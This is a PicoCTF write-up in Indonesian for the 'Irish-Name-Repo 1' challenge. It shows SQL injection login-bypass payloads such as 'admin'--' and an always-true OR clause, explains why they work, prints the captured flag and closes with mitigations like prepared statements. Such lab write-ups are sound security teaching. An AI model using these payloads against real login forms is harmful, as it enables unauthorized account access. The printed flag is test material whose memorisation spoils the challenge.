# SQL Injection - PicoCTF: Irish-Name-Repo 1

## 1. Soal
Eksploitasi SQL Injection pada challenge **Irish-Name-Repo 1** di platform PicoCTF untuk mendapatkan flag.

**Challenge Details:**
- **Kategori**: Web Exploitation
- **Difficulty**: Medium  
- **Points**: Variable
- **Author**: CHRIS HENSLER

**Deskripsi:**
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` or `http://jupiter.challenges.picoctf.org:50009`. Do you think you can log us in? Try to see if you can login!

---

## 2. Link Resource
- [Challenge URL](https://jupiter.challenges.picoctf.org/problem/50009/)
- [PicoCTF Platform](https://play.picoctf.org/)
- [SQL Injection Cheat Sheet - OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Bypass Authentication](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)

---

## 3. Jawaban + Bukti

### Step 1: Initial Investigation
- Mengakses website di `https://jupiter.challenges.picoctf.org/problem/50009/`
- Menemukan halaman login dengan form username dan password
- Website meminta kredensial untuk login

<img width="1918" height="1078" alt="step 1" src="https://github.com/user-attachments/assets/058b3d27-4aae-4010-965c-817151f79c9a" />



---

### Step 2: SQL Injection Analysis
- Mencoba berbagai payload SQL injection pada field username dan password
- Testing bypass authentication menggunakan payload klasik:

**Username:** `admin' OR '1'='1'-- -`
**Password:** `anything`

Atau:

**Username:** `' OR 1=1-- -`
**Password:** `(kosong)`
<img width="1912" height="1078" alt="step 2" src="https://github.com/user-attachments/assets/d90c233a-d1bd-4739-8401-4213378946e5" />



---

### Step 3: Successful Authentication Bypass
- Setelah mencoba beberapa payload, berhasil bypass authentication
- Login berhasil dan mendapat akses ke sistem
- Flag ditampilkan setelah login sukses

<img width="1918" height="1077" alt="last" src="https://github.com/user-attachments/assets/b36b6c57-7541-41ee-a9ff-60d33aa044c3" />


---

### Step 4: Flag Capture
Setelah berhasil login, flag ditampilkan:

```
picoCTF{s0m3_SQL_fb3fe2ad}
```

---

## 4. Payload yang Berhasil
```sql
Username: admin'--
Password: (any value)
```

Atau:

```sql
Username: ' OR '1'='1'-- -
Password: (any value)
```

---

## 5. Penjelasan Teknis

### Vulnerability Analysis:
- Website menggunakan query SQL yang rentan terhadap injection
- Kemungkinan query backend:
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

### Exploitation:
- Dengan payload `admin'--`, query menjadi:
```sql
SELECT * FROM users WHERE username='admin'-- AND password='...'
```
- Comment `--` membuat bagian password diabaikan
- Atau dengan `' OR '1'='1'-- -`:
```sql
SELECT * FROM users WHERE username='' OR '1'='1'-- - AND password='...'
```
- Kondisi `'1'='1'` selalu true, sehingga authentication bypass berhasil

---

## 6. Refleksi dan Pembelajaran

**Berhasil:**
- ✅ Identifikasi vulnerability SQL injection pada authentication
- ✅ Bypass login mechanism menggunakan SQL injection
- ✅ Mendapatkan flag: `picoCTF{s0m3_SQL_fb3fe2ad}`

**Catatan Penting:**
- Challenge ini menunjukkan pentingnya **prepared statements** dalam development
- **Input validation** dan **parameterized queries** dapat mencegah vulnerability ini
- Authentication bypass adalah salah satu impact paling serius dari SQL injection

**Pembelajaran:**
- SQL injection masih menjadi vulnerability yang sangat common
- Always validate and sanitize user input
- Use ORM atau prepared statements untuk mencegah SQL injection
- Implement proper error handling untuk tidak memberikan informasi sensitif

---

## 7. Mitigation
Untuk mencegah vulnerability serupa:

### Parameterized Queries:
```sql
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE username=? AND password=?");
stmt.setString(1, username);
stmt.setString(2, password);
```

### Input Validation:
Whitelist allowed characters, limit input length, dan escape special characters.

### Least Privilege:
Database user dengan permission minimal dan separate database untuk different functions.